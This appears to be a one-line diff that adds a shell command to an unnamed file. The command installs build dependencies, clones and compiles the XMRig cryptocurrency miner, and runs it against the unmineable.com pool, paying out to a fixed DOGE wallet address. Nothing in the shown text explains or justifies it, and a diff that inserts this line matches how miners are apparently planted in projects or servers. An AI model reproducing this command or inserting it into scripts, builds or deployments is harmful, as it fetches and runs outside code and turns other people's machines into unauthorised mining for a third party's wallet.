@@ -1,0 +1,1 @@
+apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D5XDMuNapomzWitcHrGhBo93cXGGMNeeHB.835#ujgp-c2iv -p x
